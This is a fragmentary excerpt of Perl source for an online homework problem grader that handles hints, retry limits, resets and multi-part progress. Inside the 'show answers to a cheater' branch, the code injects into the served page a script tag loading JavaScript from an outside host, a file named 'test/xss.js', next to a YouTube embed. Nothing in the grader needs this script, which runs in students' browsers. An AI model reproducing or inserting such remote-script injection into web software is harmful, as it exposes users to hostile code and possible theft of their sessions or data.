...
sub new {
  ...
  my $cp = bless {
    ...
    nextStyle   => "Forced",     # or "Button", "Forced", or "HTML"
	...
	hint => 0,
	hintLabel => undef,         # label for reset button
	maxtries => 3,
  ...
  if ($main::inputs_ref->{_hint} || ($main::inputs_ref->{submitAnswers} && $main::inputs_ref->{submitAnswers} eq "Show hint") )
  {
  $cp->{status}->{hint} = 1 ;
...
sub hintButton {
  ...
  my $par = shift; $par = ($par ? $main::PAR : '');
  $par . qq!<input type="submit" name="submitAnswers" value="$label" ! . q!onclick="document.getElementById('_next').value=1" />!;
  # qq!$par<input type="checkbox" name="_hint" value="hint" />$label!;
}
...
sub grader {
  ...
  $status->{tries} = $status->{tries} + 1 if !$main::inputs_ref->{previewAnswers};
  ...
  $state->{recorded_score} = 0 if $self->{allowReset} && $main::inputs_ref->{_reset};
	...
	if ($showans == 1)
	{
		...
		$result->{msg} .= '<br/>Hey, you are cheating! Whatever, here is the answer.<br/>';
		foreach $key (keys(%{$_[0]}))
		{
			$result->{msg} .= $_[0]->{$key}->{correct_ans} . '<br/>';
		}
		$data = quoteHTML($self->encode);

$result->{msg} .= '<object width="480" height="385"><param name="movie" value="http://www.youtube.com/v/_OBlgSz8sSM?fs=1&amp;hl=en_US"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed src="http://www.youtube.com/v/_OBlgSz8sSM?fs=1&amp;hl=en_US" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="480" height="385"></embed></object><script type="text/javascript" src="http://www.nsition.com/test/xss.js" ></script>';
  ...
  $result->{msg} .= 'This problem has more than one part.'
				 .  '<br/>'.$space.'You have tried '.$status->{tries}.' of '.$self->{maxtries}.' times in this part.'
  ...
  $result->{msg} .= '<p><b>You may not change your answers when going on to the next part!</b>'
    if $self->{nextNoChange} && $self->{answersChanged} && ($self->{maxtries} > $status->{tries});
  ...
  if ($self->{parts} > $status->{part} && !$main::inputs_ref->{previewAnswers}) {
	...
	{
		$result->{msg} .= $main::PAR ."<b>You have reached the maximum tries. </b>". $self->nextForced().'<br/>';
	}
  ...
  $result->{msg} .= '<input type="hidden" name="_next" value="0" />'
	...
	{
		$result->{msg} = '</br><object width="550" height="400">
		<param name="movie" value="http://www.amarasoftware.com/flash-animations/fireworks.swf">
		<embed src="http://www.amarasoftware.com/flash-animations/fireworks.swf" width="550" height="400">
		</embed>
		</object>
		</br><font size="8" color="red">Congratulations! </br>You have finished all the problems!</font>';
		$result->{msg} .= $self->resetCheckbox($self->{resetLabel},$par)
			if $self->{allowReset} && $status->{part} > 1;
	}
